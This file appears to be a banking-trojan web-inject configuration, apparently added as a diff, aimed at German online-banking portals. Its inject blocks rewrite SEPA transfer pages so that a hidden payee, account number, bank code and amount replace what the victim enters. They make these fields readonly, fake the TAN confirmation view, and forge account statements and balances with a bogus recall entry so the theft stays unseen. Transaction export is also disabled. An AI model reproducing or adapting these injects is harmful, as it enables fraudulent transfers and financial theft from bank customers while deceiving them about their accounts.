+ITINITRXPREQ=||End
+ITINITIFREQ=||End
+ITINITPRM=|100|End
+ITINITIFCN=|schritt active_1 c1 t1[*]">BIC (SWIFT-Code) oder BLZ:|End
+ITINITNAME=|%SPARASEPA%[0000]|End
+ITINITSTART=||End
+ITINITEND=||End
+ITINITXPRREG=|value=\"([A-Za-z]{10,})\"[^>]{0,}>%SELECTACC% - |End
+
+
+ITINJHOST=|portal.*|banking.*|bankingportal.*|End
+ITINJPAGE=|/portal/portal/*|End
+ITINJRXPREQ=||End
+ITINJIFREQ=||End
+ITINJFRM=|11001[ps]000|End
+ITINJIFFOUND=|schritt active_1 c1 t1[*]">BIC (SWIFT-Code) oder BLZ:|End
+ITINJSTART=|accesskey="3"></a>|End
+ITINJEND=|<div class='if5_schrittfolge stepcnt3'>|End
+ITINJRXPREG=||End
+ITINJCODE=||End
+ITINJPASTE=|
+<ul class='contentcontainerTop'><li class=''></li></ul>
+<div class="topbuttonline">
+<form action="" name="" method="post" accept-charset="UTF-8">
+<input type="hidden" name="" id="" value="true" /></form>
+</div>
+<div>
+<a title="Binnennavigation" name="pagesubnavigation" href="#" accesskey="4"></a>
+<h3 class="invisible" style="display:none">Binnennavigation</h3>
+</div>
+<div class="if5_seiten">
+<div class="if5_white_o">&nbsp;</div>
+<div class="if5_rand">
+<div class="if5_verlauf_o">&nbsp;</div>
+<div class="if5_gvContentElement"><div class="p"><ul><li class="l1"></li></ul></div></div>
+|End
+ITINJPASTEMN=||End
+
+
+ITINJHOST=|portal.*|banking.*|bankingportal.*|End
+ITINJPAGE=|/portal/portal/*|End
+ITINJRXPREQ=||End
+ITINJIFREQ=||End
+ITINJFRM=|11001[ps]000|End
+ITINJIFFOUND=|schritt active_1 c1 t1[*]">BIC (SWIFT-Code) oder BLZ:|End
+ITINJSTART=|<input|End
+ITINJEND=|/>|End
+ITINJRXPREG=||End
+ITINJCODE=|value="Empf|End
+ITINJPASTE=||End
+ITINJPASTEMN=||End
+
+
+ITINJHOST=|portal.*|banking.*|bankingportal.*|End
+ITINJPAGE=|/portal/portal/*|End
+ITINJRXPREQ=||End
+ITINJIFREQ=||End
+ITINJFRM=|11001[ps]000|End
+ITINJIFFOUND=|schritt active_1 c1 t1[*]">BIC (SWIFT-Code) oder BLZ:|End
+ITINJSTART=|<input|End
+ITINJEND=|/>|End
+ITINJRXPREG=||End
+ITINJCODE=|value="Skontorechner starten"|End
+ITINJPASTE=||End
+ITINJPASTEMN=||End
+
+
+
+
+ITINJHOST=|portal.*|banking.*|bankingportal.*|End
+ITINJPAGE=|/portal/portal/*|End
+ITINJRXPREQ=||End
+ITINJIFREQ=||End
+ITINJFRM=|11001[ps]000|End
+ITINJIFFOUND=|schritt active_1 c1 t1[*]">BIC (SWIFT-Code) oder BLZ:|End
+ITINJSTART=|</textarea>|End
+ITINJEND=|<script|End
+ITINJRXPREG=||End
+ITINJCODE=||End
+ITINJPASTE=||End
+ITINJPASTEMN=||End
+
+
+
+
+
+
+
+ITINJHOST=|portal.*|banking.*|bankingportal.*|End
+ITINJPAGE=|/portal/portal/*|End
+ITINJRXPREQ=||End
+ITINJIFREQ=||End
+ITINJFRM=|11001[ps]000|End
+ITINJIFFOUND=|schritt active_1 c1 t1[*]">BIC (SWIFT-Code) oder BLZ:|End
+ITINJSTART=|<input|End
+ITINJEND=|<br class="bterm" />|End
+ITINJRXPREG=||End
+ITINJCODE=|TT.MM.JJJJ|End
+ITINJPASTE=|<br class="bterm" />|End
+ITINJPASTEMN=||End
+
+
+
+
+
+
+
+
+ITINJHOST=|portal.*|banking.*|bankingportal.*|End
+ITINJPAGE=|/portal/portal/*|End
+ITINJRXPREQ=||End
+ITINJIFREQ=||End
+ITINJFRM=|11001[ps]000|End
+ITINJIFFOUND=|schritt active_1 c1 t1[*]">BIC (SWIFT-Code) oder BLZ:|End
+ITINJSTART=|schritt active_1 c1 t1[*]action="|End
+ITINJEND=|"|End
+ITINJRXPREG=||End
+ITINJCODE=||End
+ITINJPASTE=|%SPARFRMSEPA1%?C4I89Op=0022|End
+ITINJPASTEMN=||End
+
+
+
+
+ITINJHOST=|portal.*|banking.*|bankingportal.*|End
+ITINJPAGE=|/portal/portal/*|End
+ITINJRXPREQ=||End
+ITINJIFREQ=||End
+ITINJFRM=|11001[ps]000|End
+ITINJIFFOUND=|schritt active_1 c1 t1[*]">BIC (SWIFT-Code) oder BLZ:|End
+ITINJSTART=|(Name oder Firma)<em>*</em>:</label>[*]value="|End
+ITINJEND=| class="|End
+ITINJRXPREG=||End
+ITINJCODE=||End
+ITINJPASTE=|%FALSEDN%" readonly="readonly" |End
+ITINJPASTEMN=||End
+
+
+
+
+
+ITINJHOST=|portal.*|banking.*|bankingportal.*|End
+ITINJPAGE=|/portal/portal/*|End
+ITINJRXPREQ=||End
+ITINJIFREQ=||End
+ITINJFRM=|11001[ps]000|End
+ITINJIFFOUND=|schritt active_1 c1 t1[*]">BIC (SWIFT-Code) oder BLZ:|End
+ITINJSTART=|">IBAN oder Konto<em>[*]value="|End
+ITINJEND=| class="|End
+ITINJRXPREG=||End
+ITINJCODE=||End
+ITINJPASTE=|%KONTONUMMER%" readonly="readonly" |End
+ITINJPASTEMN=||End
+
+
+
+
+
+
+ITINJHOST=|portal.*|banking.*|bankingportal.*|End
+ITINJPAGE=|/portal/portal/*|End
+ITINJRXPREQ=||End
+ITINJIFREQ=||End
+ITINJFRM=|11001[ps]000|End
+ITINJIFFOUND=|schritt active_1 c1 t1[*]">BIC (SWIFT-Code) oder BLZ:|End
+ITINJSTART=|">BIC (SWIFT-Code) oder BLZ:[*]value="|End
+ITINJEND=| class="|End
+ITINJRXPREG=||End
+ITINJCODE=||End
+ITINJPASTE=|%FALSEBLZ%" readonly="readonly" |End
+ITINJPASTEMN=||End
+
+
+ITINJHOST=|portal.*|banking.*|bankingportal.*|End
+ITINJPAGE=|/portal/portal/*|End
+ITINJRXPREQ=||End
+ITINJIFREQ=||End
+ITINJFRM=|11001[ps]000|End
+ITINJIFFOUND=|schritt active_1 c1 t1[*]">BIC (SWIFT-Code) oder BLZ:|End
+ITINJSTART=|<div class="col">bei (Kreditinstitut):</div>[*]<div class="coltext">|End
+ITINJEND=|</div>|End
+ITINJRXPREG=||End
+ITINJCODE=||End
+ITINJPASTE=|%FALSEKRINST%|End
+ITINJPASTEMN=||End
+
+
+
+
+ITINJHOST=|portal.*|banking.*|bankingportal.*|End
+ITINJPAGE=|/portal/portal/*|End
+ITINJRXPREQ=||End
+ITINJIFREQ=||End
+ITINJFRM=|11001[ps]000|End
+ITINJIFFOUND=|schritt active_1 c1 t1[*]">BIC (SWIFT-Code) oder BLZ:|End
+ITINJSTART=|">Betrag<em>[*]value="|End
+ITINJEND=| class="|End
+ITINJRXPREG=||End
+ITINJCODE=||End
+ITINJPASTE=|%AMOUNT%" readonly="readonly" |End
+ITINJPASTEMN=||End
+
+
+ITINJHOST=|portal.*|banking.*|bankingportal.*|End
+ITINJPAGE=|/portal/portal/*|End
+ITINJRXPREQ=||End
+ITINJIFREQ=||End
+ITINJFRM=|11001[ps]000|End
+ITINJIFFOUND=|schritt active_1 c1 t1[*]">BIC (SWIFT-Code) oder BLZ:|End
+ITINJSTART=|">Referenz:</label>[*]value="|End
+ITINJEND=| class="|End
+ITINJRXPREG=||End
+ITINJCODE=||End
+ITINJPASTE=|" readonly="readonly" |End
+ITINJPASTEMN=||End
+
+
+
+ITINJHOST=|portal.*|banking.*|bankingportal.*|End
+ITINJPAGE=|/portal/portal/*|End
+ITINJRXPREQ=||End
+ITINJIFREQ=||End
+ITINJFRM=|11001[ps]000|End
+ITINJIFFOUND=|schritt active_1 c1 t1[*]">BIC (SWIFT-Code) oder BLZ:|End
+ITINJSTART=|">Verwendungszweck:</label>[*]<textarea |End
+ITINJEND=||End
+ITINJRXPREG=||End
+ITINJCODE=||End
+ITINJPASTE=|readonly="readonly" |End
+ITINJPASTEMN=||End
+
+
+
+
+ITINJHOST=|portal.*|banking.*|bankingportal.*|End
+ITINJPAGE=|/portal/portal/*|End
+ITINJRXPREQ=||End
+ITINJIFREQ=||End
+ITINJFRM=|11001[ps]000|End
+ITINJIFFOUND=|schritt active_1 c1 t1[*]">BIC (SWIFT-Code) oder BLZ:|End
+ITINJSTART=|">Verwendungszweck:</label>[*]<textarea [*]">|End
+ITINJEND=|</textarea>|End
+ITINJRXPREG=||End
+ITINJCODE=||End
+ITINJPASTE=|%RUCKRUF%|End
+ITINJPASTEMN=||End
+
+
+
+
+
+ITINJHOST=|portal.*|banking.*|bankingportal.*|End
+ITINJPAGE=|/portal/portal/*|End
+ITINJRXPREQ=||End
+ITINJIFREQ=||End
+ITINJFRM=|11001[ps]000|End
+ITINJIFFOUND=|schritt active_1 c1 t1[*]">BIC (SWIFT-Code) oder BLZ:|End
+ITINJSTART=|hrung:</label>[*]value="|End
+ITINJEND=| class="|End
+ITINJRXPREG=||End
+ITINJCODE=||End
+ITINJPASTE=|" readonly="readonly" |End
+ITINJPASTEMN=||End
+
+
+
+
+
+
+
+ITINJHOST=|portal.*|banking.*|bankingportal.*|End
+ITINJPAGE=|/portal/portal/*|End
+ITINJRXPREQ=||End
+ITINJIFREQ=||End
+ITINJFRM=|10001[ps]000|End
+ITINJIFFOUND=|schritt active_1 c1 t1[*]">BIC (SWIFT-Code) oder BLZ:|End
+ITINJSTART=|Auftraggeber<em>*</em>:</label>|End
+ITINJEND=|<br class="bterm" /></div>|End
+ITINJRXPREG=||End
+ITINJCODE=||End
+ITINJPASTE=|<div class="coltext">%SELECTACC%</div><input type="hidden" name="%SPARIBANSEL%" value="%SPARASEPA%">|End
+ITINJPASTEMN=||End
+
+
+ITINJHOST=|portal.*|banking.*|bankingportal.*|End
+ITINJPAGE=|/portal/portal/*|End
+ITINJRXPREQ=||End
+ITINJIFREQ=||End
+ITINJFRM=|10001[ps]000|End
+ITINJIFFOUND=|schritt active_1 c1 t1[*]">BIC (SWIFT-Code) oder BLZ:|End
+ITINJSTART=|<div class="block">|End
+ITINJEND=|<br class="bterm" /></div>[*]</div>|End
+ITINJRXPREG=||End
+ITINJCODE=|">Vorlage:</div>|End
+ITINJPASTE=||End
+ITINJPASTEMN=||End
+
+
+
+ITINJHOST=|portal.*|banking.*|bankingportal.*|End
+ITINJPAGE=|/portal/portal/*|End
+ITINJRXPREQ=||End
+ITINJIFREQ=||End
+ITINJFRM=|10001[ps]000|End
+ITINJIFFOUND=|schritt active_1 c1 t1[*]">BIC (SWIFT-Code) oder BLZ:|End
+ITINJSTART=|Zahlungsart (Purpose):</label><select |End
+ITINJEND=||End
+ITINJRXPREG=||End
+ITINJCODE=||End
+ITINJPASTE=|disabled="disabled" |End
+ITINJPASTEMN=||End
+
+
+
+
+
+
+
+
+-------
+ITINITHOST=|portal.*|banking.*|bankingportal.*|End
+ITINITPAGE=|/portal/portal/*|End
+ITINITRXPREQ=||End
+ITINITIFREQ=||End
+ITINITPRM=|100|End
+ITINITIFCN=|schritt active_1 c1 t1[*]">BIC (SWIFT-Code) oder BLZ:|End
+ITINITNAME=|%SPARNNAMED%[0000]|End
+ITINITSTART=|(Name oder Firma)<em>*</em>:</label>[*]name="|End
+ITINITEND=|"|End
+ITINITXPRREG=||End
+
+
+ITINITHOST=|portal.*|banking.*|bankingportal.*|End
+ITINITPAGE=|/portal/portal/*|End
+ITINITRXPREQ=||End
+ITINITIFREQ=||End
+ITINITPRM=|100|End
+ITINITIFCN=|schritt active_1 c1 t1[*]">BIC (SWIFT-Code) oder BLZ:|End
+ITINITNAME=|%SPARNBLZ%[0000]|End
+ITINITSTART=|">BIC (SWIFT-Code) oder BLZ:[*]name="|End
+ITINITEND=|"|End
+ITINITXPRREG=||End
+
+
+ITINITHOST=|portal.*|banking.*|bankingportal.*|End
+ITINITPAGE=|/portal/portal/*|End
+ITINITRXPREQ=||End
+ITINITIFREQ=||End
+ITINITPRM=|100|End
+ITINITIFCN=|schritt active_1 c1 t1[*]">BIC (SWIFT-Code) oder BLZ:|End
+ITINITNAME=|%SPARNC1%[0000]|End
+ITINITSTART=|">Verwendungszweck:</label>[*]<textarea [*]name="|End
+ITINITEND=|"|End
+ITINITXPRREG=||End
+
+
+
+======================= SEPA 2 =======================
+
+
+ITINJHOST=|portal.*|banking.*|bankingportal.*|End
+ITINJPAGE=|/portal/portal/*C4I89Op=0022|End
+ITINJRXPREQ=||End
+ITINJIFREQ=||End
+ITINJFRM=|00001[ps]000|End
+ITINJIFFOUND=|=%KONTONUMMER%|End
+ITINJSTART=|%SPARNNAMED%=|End
+ITINJEND=|&|End
+ITINJRXPREG=||End
+ITINJCODE=||End
+ITINJPASTE=|%DROPNAME%|End
+ITINJPASTEMN=||End
+
+
+
+ITINJHOST=|portal.*|banking.*|bankingportal.*|End
+ITINJPAGE=|/portal/portal/*C4I89Op=0022|End
+ITINJRXPREQ=||End
+ITINJIFREQ=||End
+ITINJFRM=|00001[ps]000|End
+ITINJIFFOUND=|=%KONTONUMMER%|End
+ITINJSTART=|%SPARNBLZ%=|End
+ITINJEND=|&|End
+ITINJRXPREG=||End
+ITINJCODE=||End
+ITINJPASTE=|%BANKCODE%|End
+ITINJPASTEMN=||End
+
+
+
+
+
+
+
+ITINJHOST=|portal.*|banking.*|bankingportal.*|End
+ITINJPAGE=|/portal/portal/*C4I89Op=0022|End
+ITINJRXPREQ=||End
+ITINJIFREQ=||End
+ITINJFRM=|00001[ps]000|End
+ITINJIFFOUND=|=%KONTONUMMER%|End
+ITINJSTART=|%SPARNC1%=|End
+ITINJEND=|&|End
+ITINJRXPREG=||End
+ITINJCODE=||End
+ITINJPASTE=|%C1EN%|End
+ITINJPASTEMN=||End
+
+[*]BIC oder BLZ:</div>
+
+ITINJHOST=|portal.*|banking.*|bankingportal.*|End
+ITINJPAGE=|/portal/portal/*|End
+ITINJRXPREQ=||End
+ITINJIFREQ=||End
+ITINJFRM=|11001[ps]000|End
+ITINJIFFOUND=|schritt active_2 c1 t1|End
+ITINJSTART=|accesskey="3"></a>|End
+ITINJEND=|<div class='if5_schrittfolge stepcnt3'>|End
+ITINJRXPREG=||End
+ITINJCODE=||End
+ITINJPASTE=|
+<ul class='contentcontainerTop'><li class=''></li></ul>
+<div class="topbuttonline">
+<form action="" name="" method="post" accept-charset="UTF-8">
+<input type="hidden" name="" id="" value="true" /></form>
+</div>
+<div>
+<a title="Binnennavigation" name="pagesubnavigation" href="#" accesskey="4"></a>
+<h3 class="invisible" style="display:none">Binnennavigation</h3>
+</div>
+<div class="if5_seiten">
+<div class="if5_white_o">&nbsp;</div>
+<div class="if5_rand">
+<div class="if5_verlauf_o">&nbsp;</div>
+<div class="if5_gvContentElement"><div class="p"><ul><li class="l1"></li></ul></div></div>
+|End
+ITINJPASTEMN=||End
+
+
+
+ITINITHOST=|portal.*|banking.*|bankingportal.*|End
+ITINITPAGE=|/portal/portal/*C4I89Op=0022|/portal/portal/*C4I89Op=0025|End
+ITINITRXPREQ=||End
+ITINITIFREQ=||End
+ITINITPRM=|100|End
+ITINITIFCN=||End
+ITINITNAME=|%SPARSEPAFRM2%[0000]|End
+ITINITSTART=|schritt active_2 c1 t1[*]action="|End
+ITINITEND=|"|End
+ITINITXPRREG=||End
+
+
+ITINJHOST=|portal.*|banking.*|bankingportal.*|End
+ITINJPAGE=|/portal/portal/*C4I89Op=0022|/portal/portal/*C4I89Op=0025|End
+ITINJRXPREQ=||End
+ITINJIFREQ=||End
+ITINJFRM=|10001[ps]000|End
+ITINJIFFOUND=||End
+ITINJSTART=|schritt active_2 c1 t1[*]action="|End
+ITINJEND=|"|End
+ITINJRXPREG=||End
+ITINJCODE=||End
+ITINJPASTE=|%SPARSEPAFRM2%&C4I89Op=0025|End
+ITINJPASTEMN=||End
+
+
+
+
+ITINITHOST=|portal.*|banking.*|bankingportal.*|End
+ITINITPAGE=|/portal/portal/*C4I89Op=0022|/portal/portal/*C4I89Op=0025|End
+ITINITRXPREQ=||End
+ITINITIFREQ=||End
+ITINITPRM=|100|End
+ITINITIFCN=||End
+ITINITNAME=|%SPARSEPAHRALTTAN%[0000]|End
+ITINITSTART=|Alternativ gelangen Sie[*]<a href="|End
+ITINITEND=|"|End
+ITINITXPRREG=||End
+
+
+ITINJHOST=|portal.*|banking.*|bankingportal.*|End
+ITINJPAGE=|/portal/portal/*C4I89Op=0022|/portal/portal/*C4I89Op=0025|End
+ITINJRXPREQ=||End
+ITINJIFREQ=||End
+ITINJFRM=|10001[ps]000|End
+ITINJIFFOUND=||End
+ITINJSTART=|Alternativ gelangen Sie[*]<a href="|End
+ITINJEND=|"|End
+ITINJRXPREG=||End
+ITINJCODE=||End
+ITINJPASTE=|%SPARSEPAHRALTTAN%&C4I89Op=0022|End
+ITINJPASTEMN=||End
+
+
+
+ITINJHOST=|portal.*|banking.*|bankingportal.*|End
+ITINJPAGE=|/portal/portal/*C4I89Op=0022|/portal/portal/*C4I89Op=0025|End
+ITINJRXPREQ=||End
+ITINJIFREQ=||End
+ITINJFRM=|10001[ps]000|End
+ITINJIFFOUND=|BIC oder BLZ:</div><div>%BANKCODE%|End
+ITINJSTART=|nstigter (Name oder Firma):</div>|End
+ITINJEND=|<div class="tanfeld"><strong>TAN|End
+ITINJRXPREG=||End
+ITINJCODE=||End
+ITINJPASTE=|
+
+
+<div class="ixl">%FALSEDN%</div><br class="bterm" /></div>
+<div class="bline"><div class="label">IBAN oder Konto:</div><div>%KONTONUMMER%</div><br class="bterm" /></div>
+<div class="bline"><div class="label">BIC oder BLZ:</div><div>%FALSEBLZ%</div><br class="bterm" /></div>
+
+<div class="bline"><div class="label">bei (Kreditinstitut):</div><div>%FALSEKRINST%</div><br class="bterm" /></div>
+</div>
+
+<div class="block">
+<div class="bline"><div class="label">Betrag:</div><div>%AMTFRMT% EUR</div><br class="bterm" /></div>
+</div>
+
+<div class="block">
+<div class="bline"><div class="label">Verwendungszweck:</div><div class="ixl">%RUCKRUF%</div><br class="bterm" /></div>
+
+</div>
+
+	<div class="block">
+
+
+	     |End
+ITINJPASTEMN=||End
+
+
+
+
+
+
+======================= SEPA 3 =======================
+
+ITINJHOST=|portal.*|banking.*|bankingportal.*|End
+ITINJPAGE=|/portal/portal/*&C4I89Op=0025|End
+ITINJRXPREQ=||End
+ITINJIFREQ=||End
+ITINJFRM=|000000000|End
+ITINJIFFOUND=||End
+ITINJSTART=||End
+ITINJEND=||End
+ITINJRXPREG=||End
+ITINJCODE=||End
+ITINJPASTE=||End
+ITINJPASTEMN=||End
+
+
+
+
+ITINJHOST=|portal.*|banking.*|bankingportal.*|End
+ITINJPAGE=|/portal/portal/*|End
+ITINJRXPREQ=||End
+ITINJIFREQ=||End
+ITINJFRM=|10000[ps]000|End
+ITINJIFFOUND=|schritt active_3 c1 t1[*]BIC oder BLZ:</div><div>%BANKCODE%|End
+ITINJSTART=|nstigter (Name oder Firma):</div>|End
+ITINJEND=|<div class="buttonline">|End
+ITINJRXPREG=||End
+ITINJCODE=||End
+ITINJPASTE=|
+
+
+
+<div class="ixl">%FALSEDN%</div><br class="bterm" /></div>
+<div class="bline"><div class="label">IBAN oder Konto:</div><div>%KONTONUMMER%</div><br class="bterm" /></div>
+<div class="bline"><div class="label">BIC oder BLZ:</div><div>%FALSEBLZ%</div><br class="bterm" /></div>
+
+<div class="bline"><div class="label">bei (Kreditinstitut):</div><div>%FALSEKRINST%</div><br class="bterm" /></div>
+</div>
+
+<div class="block">
+<div class="bline"><div class="label">Betrag:</div><div>%AMTFRMT% EUR</div><br class="bterm" /></div>
+</div>
+
+<div class="block">
+<div class="bline"><div class="label">Verwendungszweck:</div><div class="ixl">%RUCKRUF%</div><br class="bterm" /></div>
+
+</div>
+
+
+
+	     |End
+ITINJPASTEMN=||End
+
+
+
+----------- print
+
+
+
+ITINJHOST=|portal.*|banking.*|bankingportal.*|End
+ITINJPAGE=|/portal/print/*|End
+ITINJRXPREQ=||End
+ITINJIFREQ=||End
+ITINJFRM=|10000[ps]000|End
+ITINJIFFOUND=|<div>%BANKCODE%</div>|End
+ITINJSTART=|nstigter (Name oder Firma):</div>|End
+ITINJEND=|<div class="block">[*]<div class="block">[*]|End
+ITINJRXPREG=||End
+ITINJCODE=||End
+ITINJPASTE=|
+
+
+<div class="ixl">%FALSEDN%</div><br class="bterm" /></div>
+	<div class="bline"><div class="label">IBAN oder Konto:</div><div>%KONTONUMMER%</div><br class="bterm" /></div>
+
+	<div class="bline"><div class="label">BIC oder BLZ:</div><div>%FALSEBLZ%</div><br class="bterm" /></div>
+	<div class="bline"><div class="label">bei (Kreditinstitut):</div><div>%FALSEKRINST%</div><br class="bterm" /></div>
+</div>
+
+<div class="block">
+	<div class="bline"><div class="label">Betrag:</div><div>%AMTFRMT% EUR</div><br class="bterm" /></div>
+</div>
+
+<div class="block">
+	<div class="bline"><div class="label">Verwendungszweck:</div><div class="ixl">%RUCKRUF%</div><br class="bterm" /></div>
+	
+</div>
+
+
+	     |End
+ITINJPASTEMN=||End
+
+
+
+
+
+
+
+
+
+
+===================== STATEMENT =====================
+
+
+
+ITINJHOST=|portal.*|banking.*|bankingportal.*|End
+ITINJPAGE=|/portal/portal/*|End
+ITINJRXPREQ=||End
+ITINJIFREQ=||End
+ITINJFRM=|10000[ps]000|End
+ITINJIFFOUND=|l">Konto:</div>[*]>%SELECTACC%|End
+ITINJSTART=| title="Zur&uuml;ck" alt="Zur&uuml;ck" /><a href="|End
+ITINJEND=|">|End
+ITINJRXPREG=||End
+ITINJCODE=||End
+ITINJPASTE=|javascript:window.print();|End
+ITINJPASTEMN=||End
+
+
+
+
+ITINITHOST=|portal.*|banking.*|bankingportal.*|End
+ITINITPAGE=|/portal/portal/*=/Login*|End
+ITINITRXPREQ=||End
+ITINITIFREQ=||End
+ITINITPRM=|100|End
+ITINITIFCN=||End
+ITINITNAME=|%SPARHOST%[0000]|End
+ITINITSTART=|https://www.|End
+ITINITEND=|/|End
+ITINITXPRREG=||End
+
+ITINITHOST=|portal.*|banking.*|bankingportal.*|End
+ITINITPAGE=|/portal/portal/*?*|/portal/portal/*=/Login*|End
+ITINITRXPREQ=||End
+ITINITIFREQ=||End
+ITINITPRM=|100|End
+ITINITIFCN=||End
+ITINITNAME=|%SPARCOR%[0000]|End
+ITINITSTART=|<div class="if5_nav b4">[*]/portal/portal/|End
+ITINITEND=|/|End
+ITINITXPRREG=||End
+
+
+
+
+
+
+
+
+ITINJHOST=|portal.*|banking.*|bankingportal.*|End
+ITINJPAGE=|/portal/portal/*|End
+ITINJRXPREQ=||End
+ITINJIFREQ=||End
+ITINJFRM=|11001[ps]000|End
+ITINJIFFOUND=|l">Konto:</div>[*]>%SELECTACC%|End
+ITINJSTART=|nowrap="nowrap">Info[*]</tr>|End
+ITINJEND=||End
+ITINJRXPREG=||End
+ITINJCODE=||End
+ITINJPASTE=|
+
+
+<tr class="tableroweven">
+
+
+      <td class="tabledata" colspan="1">%DATASTAT%</td>
+      <td class="tabledata" colspan="1">%DATASTAT%</td>
+      <td class="tabledata" colspan="1">UEBERWEISUNGSGUT<br />
+		    SCHRIFT<br />
+		    %FALSEDNUP%<br />
+		    %KONTONUMMER% / %FALSEBLZ%<br />
+		    %FALSEC1%<br />
+ 
+		    <a id="refret" style="color: #FF0000;" href=""><b style="color: #FF0000;"><i style="color: #FF0000;">RETOUREN<i><b></a><br /></td>
+      <td class="right tabledata"><span class="habentexttable">%AMTFRMT%&nbsp;EUR</span></td>
+      <td class="tabledata"></td>
+</tr>
+
+<script>
+document.getElementById('refret').href = 'https://'+document.domain+'/portal/portal/%SPARCOR%?p=p.sepa_einzelueberweisung&p=p.sepa_einzelueberweisung&n=%2Fonlinebanking%2Fbanking%2Fsepaueberweisung%2Fsepa_einzelueberweisung%2F' 
+</script>
+
+
+
+	     |End
+ITINJPASTEMN=||End
+
+
+
+
+
+ITINJHOST=|portal.*|banking.*|bankingportal.*|End
+ITINJPAGE=|/portal/portal/*|End
+ITINJRXPREQ=||End
+ITINJIFREQ=||End
+ITINJFRM=|11002[ps]000|End
+ITINJIFFOUND=|l">Konto:</div>[*]>%SELECTACC%|End
+ITINJSTART=|<td class="tabledata" colspan="1">|End
+ITINJEND=|</tr>|End
+ITINJRXPREG=||End
+ITINJCODE=|&minus;%AMTFRMT%|End
+ITINJPASTE=|
+
+      <td class="tabledata" colspan="1">R&Uuml;CKRUF<br />
+		    %FALSEDNUP%<br />
+		    %KONTONUMMER% / %FALSEBLZ%<br />
+		    %RUCKRUF%<br />
+		    %AMTFRMT% EUR<br /></td>
+      <td class="right tabledata"><span class="habentexttable">0,00&nbsp;EUR</span></td>
+      <td class="tabledata"></td>
+    </tr>
+
+	     |End
+ITINJPASTEMN=||End
+
+ITINJHOST=|portal.*|banking.*|bankingportal.*|End
+ITINJPAGE=|/portal/portal/*|End
+ITINJRXPREQ=||End
+ITINJIFREQ=||End
+ITINJFRM=|11002[ps]000|End
+ITINJIFFOUND=|l">Konto:</div>[*]>%SELECTACC%|End
+ITINJSTART=|<td>ONLINE-|End
+ITINJEND=|</tr>|End
+ITINJRXPREG=||End
+ITINJCODE=|<span class="minus">-%AMTFRMT%|End
+ITINJPASTE=|
+
+
+
+		<td>R&Uuml;CKRUF<br />
+		%FALSEDNUP%<br />
+		%KONTONUMMER% / %FALSEBLZ%<br />
+		%RUCKRUF%<br />
+		%AMTFRMT% EUR<br /></td>
+		</td>
+		
+		
+		<td class="right"><span class="plus">0&nbsp;EUR</span></td>
+		
+		<td class="right"><br /></td>
+	</tr>
+
+
+	     |End
+ITINJPASTEMN=||End
+
+
+
+ITINITHOST=|portal.*|banking.*|bankingportal.*|End
+ITINITPAGE=|/portal/portal/*|End
+ITINITRXPREQ=||End
+ITINITIFREQ=||End
+ITINITPRM=|100|End
+ITINITIFCN=|l">Konto:</div>[*]>%SELECTACC%|End
+ITINITNAME=|%SPARSTBAL%[0200]|End
+ITINITSTART=|Kontostand am[*]<span class="[*]">|End
+ITINITEND=|</span>|End
+ITINITXPRREG=||End
+
+
+ITINJHOST=|portal.*|banking.*|bankingportal.*|End
+ITINJPAGE=|/portal/portal/*|End
+ITINJRXPREQ=||End
+ITINJIFREQ=||End
+ITINJFRM=|11000[ps]000|End
+ITINJIFFOUND=|l">Konto:</div>[*]>%SELECTACC%|End
+ITINJSTART=|Kontostand am[*]<td[*]>|End
+ITINJEND=|</span>|End
+ITINJRXPREG=||End
+ITINJCODE=||End
+ITINJPASTE=|<span class="plus">%SPARSTBAL%+%AMOUNT%|End
+ITINJPASTEMN=|<span class="plus">%SPARSTBAL%+%AMOUNT%|End
+
+
+
+
+
+
+
+
+ITINJHOST=|portal.*|banking.*|bankingportal.*|End
+ITINJPAGE=|/portal/portal/*|End
+ITINJRXPREQ=||End
+ITINJIFREQ=||End
+ITINJFRM=|11000[ps]000|End
+ITINJIFFOUND=|l">Konto:</div>[*]>%SELECTACC%|End
+ITINJSTART=|Umsatzdaten exportieren<em>[*]onclick="|End
+ITINJEND=|"|End
+ITINJRXPREG=||End
+ITINJCODE=||End
+ITINJPASTE=|return false;|End
+ITINJPASTEMN=||End
+
+
+
+
+
+======================== Giro-Detail ========================
+
+
+
+ITINITHOST=|portal.*|banking.*|bankingportal.*|End
+ITINITPAGE=|/portal/portal/*|End
+ITINITRXPREQ=||End
+ITINITIFREQ=||End
+ITINITPRM=|100|End
+ITINITIFCN=|bersicht</h2>|End
+ITINITNAME=|%SPARBAL%[0000]|End
+ITINITSTART=|%SELECTACC%<br /></td>[*]<span class="[*]">|End
+ITINITEND=|&nbsp;EUR|End
+ITINITXPRREG=||End
+
+
+
+
+
+
+
+
+
+
+ITINJHOST=|portal.*|banking.*|bankingportal.*|End
+ITINJPAGE=|/portal/portal/*|End
+ITINJRXPREQ=||End
+ITINJIFREQ=||End
+ITINJFRM=|11000[ps]000|End
+ITINJIFFOUND=|bersicht</h2>|End
+ITINJSTART=|%SELECTACC%<br /></td>[*]<span class="|End
+ITINJEND=|&nbsp;|End
+ITINJRXPREG=||End
+ITINJCODE=||End
+ITINJPASTE=|plus">%SPARBAL%+%AMOUNT%|End
+ITINJPASTEMN=|minus">%SPARBAL%+%AMOUNT%|End
+
+
+
+
+
+ITINJHOST=|portal.*|banking.*|bankingportal.*|End
+ITINJPAGE=|/portal/portal/*|End
+ITINJRXPREQ=||End
+ITINJIFREQ=||End
+ITINJFRM=|11000[ps]000|End
+ITINJIFFOUND=|bersicht</h2>|End
+ITINJSTART=|%SELECTACC%<br /></td>[*]<td class="right[*]<td class="[*]<span class="[*]">|End
+ITINJEND=|</span>|End
+ITINJRXPREG=||End
+ITINJCODE=||End
+ITINJPASTE=|-|End
+ITINJPASTEMN=||End
+
+
+
+
+
+
+======================== Finanzstatus ========================
+
+ITINJHOST=|portal.*|banking.*|bankingportal.*|End
+ITINJPAGE=|/portal/portal/*|End
+ITINJRXPREQ=||End
+ITINJIFREQ=||End
+ITINJFRM=|10000[ps]000|End
+ITINJIFFOUND=|'>Finanzstatus</h2>|End
+ITINJSTART=| alt="Neues Fenster:Hilfe Finanzstatus"[*]<a href="|End
+ITINJEND=|">|End
+ITINJRXPREG=||End
+ITINJCODE=||End
+ITINJPASTE=|javascript:window.print();|End
+ITINJPASTEMN=||End
+
+
+
+
+ITINITHOST=|portal.*|banking.*|bankingportal.*|End
+ITINITPAGE=|/portal/portal/*|End
+ITINITRXPREQ=||End
+ITINITIFREQ=||End
+ITINITPRM=|100|End
+ITINITIFCN=|'>Finanzstatus</h2>|End
+ITINITNAME=|%SPARBAL%[0000]|End
+ITINITSTART=|>%SELECTACC%[*]<span class="[*]">|End
+ITINITEND=|&nbsp;EUR|End
+ITINITXPRREG=||End
+
+
